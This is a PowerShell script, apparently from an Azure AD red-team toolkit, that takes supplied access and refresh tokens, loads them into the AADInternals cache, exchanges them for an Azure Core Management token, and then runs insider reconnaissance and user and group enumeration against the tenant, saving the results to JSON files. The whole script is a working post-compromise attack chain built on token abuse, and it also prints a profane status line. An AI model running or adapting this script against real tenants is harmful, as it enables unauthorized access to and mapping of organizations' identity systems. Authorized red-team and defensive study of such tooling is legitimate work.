[CmdletBinding()]
param (
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$response,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$refreshToken,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$accessToken,
    [Parameter(ValueFromPipelineByPropertyName=$true)]
    [string]$domain
)

Write-Output "Yes the fucking Recon script is running, wtf"

$import = .\Scripts\Import.ps1

$access = $accessToken
$refresh = $refreshToken

# # Target details constructed from token   
# $acc = Read-AADIntAccessToken $access
# $user = $acc.upn
# $domain = $user.Split("@")[1]

Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh

# AADInternals Initial Recon
Write-Output "Invoking AADInternals recon as insider"
$core=Invoke-RefreshToAzureCoreManagementToken -domain $domain
Add-AADIntAccessTokenToCache -AccessToken $core.access_token -RefreshToken $core.refresh_token 
$results = Invoke-AADIntReconAsInsider
$jsonContent = $results | ConvertTo-Json
$jsonContent | Out-File -FilePath "intrecon.json"

# User and Group Enumeration
Write-Output "Invoking AADInternals User and Group enumeration"
$userEnum = Invoke-AADIntUserEnumerationAsInsider
$jsonContent = $userEnum | ConvertTo-Json
$jsonContent | Out-File -FilePath "userEnum.json"

